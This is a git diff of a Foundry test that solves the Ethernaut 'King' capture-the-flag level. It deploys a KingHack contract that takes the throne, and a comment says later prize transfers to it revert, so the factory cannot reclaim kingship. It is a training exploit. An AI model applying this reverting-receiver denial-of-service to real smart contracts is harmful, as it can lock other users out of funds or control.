@@ -37,11 +37,12 @@ contract KingTest is Test {
 
         // Set caller to custom address
         vm.startPrank(eoa);
+        vm.deal(eoa, 1 ether);
 
         // Start recording logs to capture new level instance address
         vm.recordLogs();
         // Create new level instance via Ethernaut
-        ethernaut.createLevelInstance(kingFactory);
+        ethernaut.createLevelInstance{value: 0.001 ether}(kingFactory);
 
         // Parse emitted logs
         Vm.Log[] memory entries = vm.getRecordedLogs();
@@ -62,6 +63,25 @@ contract KingTest is Test {
         King instance = King(payable(instanceAddress));
 
         /* Level Hack */
+        address king = instance._king();
+        emit log_named_address("king", king);
+        assertEq(king, address(kingFactory));
+
+        uint256 prize = instance.prize();
+        assertEq(prize, 0.001 ether);
+        emit log_named_uint("prize", prize);
+
+        // 1. Deploy and set KingHack as the king
+        // Subsequent prize transfer to KingHack will revert thus preventing KingFactory from claiming ownership
+        KingHack kingHack = new KingHack{value: 0.002 ether}(instanceAddress);
+
+        king = instance._king();
+        emit log_named_address("king", king);
+        assertEq(king, address(kingHack));
+
+        prize = instance.prize();
+        assertEq(prize, 0.002 ether);
+        emit log_named_uint("prize", 0.002 ether);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
